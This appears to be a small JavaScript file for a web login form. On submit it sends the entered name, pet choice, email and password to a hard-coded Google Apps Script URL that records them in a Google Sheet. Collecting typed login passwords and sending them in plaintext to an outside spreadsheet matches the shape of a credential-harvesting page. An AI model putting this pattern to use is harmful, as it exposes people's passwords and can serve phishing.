const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxOfXHntnhl0cwjSJ7ArJwyBN-CNLOJfh60EuOd12emzIQmLhj7443wEotDz6hmxOT2/exec';

document.getElementById('loginForm').addEventListener('submit', function (event) {
  event.preventDefault();

  const submitBtn = document.querySelector('.btn-login');
  submitBtn.innerText = 'Submitting...';
  submitBtn.disabled = true;

  // Prepare parameters
  const formData = new URLSearchParams();
  formData.append('name', document.getElementById('name').value);
  formData.append('petChoice', document.getElementById('petChoice').value);
  formData.append('email', document.getElementById('email').value);
  formData.append('password', document.getElementById('password').value);

  // Send request
  fetch(GOOGLE_SCRIPT_URL, {
    method: 'POST',
    mode: 'no-cors',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: formData.toString()
  })
  .then(() => {
    alert('Submitted successfully! Check your Google Sheet.');
    document.getElementById('loginForm').reset();
  })
  .catch((error) => {
    console.error('Submission error:', error);
    alert('Submission failed. Check developer console (F12).');
  })
  .finally(() => {
    submitBtn.innerText = 'Login';
    submitBtn.disabled = false;
  });
});
